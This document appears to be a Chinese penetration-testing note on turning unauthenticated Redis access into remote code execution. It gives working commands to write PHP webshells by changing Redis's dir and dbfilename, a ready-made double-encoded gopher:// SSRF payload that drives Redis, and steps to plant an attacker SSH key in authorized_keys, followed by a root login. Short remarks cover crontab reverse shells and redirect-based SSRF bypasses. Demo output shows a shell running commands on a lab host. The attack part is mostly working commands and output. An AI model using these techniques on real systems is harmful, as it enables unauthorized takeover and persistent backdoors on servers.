### redis的RCE

三种方式：
- 写webshell（需要知道web绝对路径、web路径redis用户有权限写）
- 写入到crontab
- 将攻击者的公钥写入到authorized_key，使用攻击者的私钥ssh登录（需要开启ssh服务）


#### 说明
```
dir: 工作目录
dbfilename: 数据库的文件名
```

### redis写shell原理

设置dir工作目录，然后设置dbfilename，通过这两个步骤设置了数据库的绝对路径和文件名。后续写入的键值对就写入到这个可控的文件中（初衷是数据库文件），这里变成了攻击者的shell文件。

在redis-cli下查看这两个值：
```
127.0.0.1:6379> config get dir
1) "dir"
2) "/var/lib/redis"
127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
```
然后在系统上查看这个目录和文件的权限。redis用户对这个文件具有读写权限。这个目录也是只有redis这个用户才能访问。

```
root@ubuntu:/proc# ll /var/lib/redis
total 188
drwxr-x---  2 redis redis  4096 Jan 10 22:25 ./
drwxr-xr-x 73 root  root   4096 Nov  5 22:35 ../
-rw-rw----  1 redis redis 58587 Jan 10 22:25 dump.rdb
-rw-rw----  1 redis redis 58587 Dec  9 18:46 temp-33935.rdb
-rw-rw----  1 redis redis 58587 Dec 27 17:58 temp-67951.rdb
```


### redis启动的权限问题
如果想通过redis写入webshell，而redis是以redis用户启动，apache2是以www-data用户启动，则redis用户无法写入/var/www/目录的文件。在save步骤会出错。
```
127.0.0.1:6379> set 1 "<?php @eval($_POST['cqq']);?>    "
OK
127.0.0.1:6379> save
(error) ERR
```

### redis写webshell步骤
```
127.0.0.1:6379> config set dir /var/www
OK
127.0.0.1:6379> config set dbfilename redis_shell4.php
OK
127.0.0.1:6379> set 1111 "    <?php system($_REQUEST['cqq']);?>   "
OK
127.0.0.1:6379> save
```

利用SSRF漏洞使用gopher协议实现，利用这个工具：
- https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher


修改`redis.cmd`文件中的命令，
```
flushdb
config set dir /var/html
config set dbfilename rshell2.php
set 1 '<?php phpinfo();?>'
save
quit
```
然后执行：
```
$ python2 redis-over-gopher.py
gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%37%0d%0a%66%6c%75%73%68%64%62%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%38%0d%0a%2f%76%61%72%2f%77%77%77%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%30%0d%0a%72%73%68%65%6c%6c%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%0d%0a%31%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a%2a%31%0d%0a%24%34%0d%0a%71%75%69%74%0d%0a
```
得到gopher协议的payload。
然后需要对这个payload再进行一次urlencode：
```
gopher://127.0.0.1:6379/_%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%37%25%30%64%25%30%61%25%36%36%25%36%63%25%37%35%25%37%33%25%36%38%25%36%34%25%36%32%25%30%64%25%30%61%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%36%34%25%36%39%25%37%32%25%30%64%25%30%61%25%32%34%25%33%38%25%30%64%25%30%61%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%30%64%25%30%61%25%32%61%25%33%34%25%30%64%25%30%61%25%32%34%25%33%36%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%31%25%33%30%25%30%64%25%30%61%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%30%64%25%30%61%25%32%34%25%33%31%25%33%30%25%30%64%25%30%61%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%32%61%25%33%33%25%30%64%25%30%61%25%32%34%25%33%33%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%30%64%25%30%61%25%32%34%25%33%31%25%30%64%25%30%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%31%25%33%38%25%30%64%25%30%61%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%37%30%25%36%38%25%37%30%25%36%39%25%36%65%25%36%36%25%36%66%25%32%38%25%32%39%25%33%62%25%33%66%25%33%65%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61%25%32%61%25%33%31%25%30%64%25%30%61%25%32%34%25%33%34%25%30%64%25%30%61%25%37%31%25%37%35%25%36%39%25%37%34%25%30%64%25%30%61
```


#### Demo
```
$ curl -i http://192.168.85.129/redis_shell4.php?cqq=ifconfig --output -
HTTP/1.1 200 OK
Date: Mon, 11 Jan 2021 08:00:12 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2538
Content-Type: text/html; charset=UTF-8

REDIS0008	redis-ver4.0.9
redis-bits󿿀򳨭eused-memÐ
                      Ϻ
                       aof-preamble~򀕄(    br-3f4328a91e7c: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:91:42:81:60  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### 写入攻击者公钥实现rce
先生成公私钥对：
```
$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/77/.ssh/id_rsa): /home/77/.ssh/redis_id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/77/.ssh/redis_id_rsa.
Your public key has been saved in /home/77/.ssh/redis_id_rsa.pub.
The key fingerprint is:
SHA256:ostXG7ywBhLm9vwOeJYn56d6W8mEJBnzFyQXGYYXCN8 77@ubuntu130
The key's randomart image is:
+---[RSA 2048]----+
|    +..+O=       |
|     *o=o.       |
|    o +.E        |
|  o  o o         |
| o .  o.S        |
|  +..o.++.       |
| ..+B.o+++       |
|   +oB=.+        |
|    +B*+         |
+----[SHA256]-----+

$ ll /home/77/.ssh/
total 28K
drwx------  2 77 77 4.0K Jan 11 00:06 ./
-rw-------  1 77 77 1.8K Jan 11 00:06 redis_id_rsa
-rw-r--r--  1 77 77  394 Jan 11 00:06 redis_id_rsa.pub
```

然后将公钥写到authorized_key文件里，注意如果直接写入，或者前后加空格写入，是不能起效果的。需要将公钥写入到文件，然后在文件前后加上换行符。
```
# (echo -e "\n\n\n\n"; cat redis_id_rsa.pub; echo -e "\n\n\n\n") > test.pub
root@ubuntu:~/.ssh# cat test.pub |redis-cli -x set 344444
OK
```
再连接redis确认这个值是否写入了换行符：
```
$ redis-cli
127.0.0.1:6379> get 344444
"\n\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChQBXUegXtU6HK7F9MKuWDPgKNt8Y2h2FNtg14x5qeX9mRrlurytc4dNPvmpuuNZY0yDBi2QAK4Py7bfBbRWLvcFWALoRcXfPobQzRk3beWzWifVZm9iibahqOGgmfKN1DJ5/KTvEHgtGmWOLAjr2ddy5HUnwXSjb3KBgJqdsvt+eQFWHZLDSFem5oU1hni+a/5tVFhciif5AFCpq8e1F+4RrqIGtfOj4IrW3PrqCWJUI60IUgL4MjYqBIf7sctMgGO6Ezlg86Eo8bPdpUh3ygooB6FOJaWqEiB9Kd1gEUIgaj5C/5Dt3McwTzUliJ8DhZ7dw5kUt1mC9hd3oz+AzR 77@ubuntu130\n\n\n\n\n"
127.0.0.1:6379> save
OK
```
从攻击者机器向redis所在的ssh服务发起连接：
```
$ ssh root@192.168.85.129 -i ~/.ssh/redis_id_rsa
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-54-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
New release '20.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

You have new mail.
Last login: Mon Jan 11 00:04:44 2021 from 192.168.85.130
root@ubuntu:~#
```


### 通过计划任务实现RCE
//TODO
> 测试了centos7和ubuntu，默认情况下redis写入计划任务反弹shell，在centos下是可以的。
由于redis写入文件会写入脏数据，ubuntu计划任务不允许有脏数据，所以ubuntu没办法通过redis写入计划任务进行操作。

参考： 
- [redis数据库在渗透中的利用](https://xz.aliyun.com/t/8018#toc-8)


### 302跳转

- 绕过IP白名单限制，
- 跳转到`http://brutelogic.com.br/poc.svg`等，转换成反射型XSS。
- 限定协议时，跳转到攻击者控制的主机，然后location：其他协议。

### 其他方式
//TODO
- redis主从复制
- 加载module
- 写入/etc/passwd 实现ssh登录

### 参考
- [利用redis写webshell](https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html)
- [redis 在渗透中 getshell 方法总结](https://zhuanlan.zhihu.com/p/36529010)
- [浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)
- [ssrf与gopher与redis](https://www.cnblogs.com/sijidou/p/13681845.html)
- [通过一道审计题了解SSRF](https://www.smi1e.top/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E5%AE%A1%E8%AE%A1%E9%A2%98%E4%BA%86%E8%A7%A3ssrf/)
- [不请自来 | Redis 未授权访问漏洞深度利用](https://www.freebuf.com/vuls/148758.html)
- http://blog.leanote.com/post/snowming/2d9a2082c02b
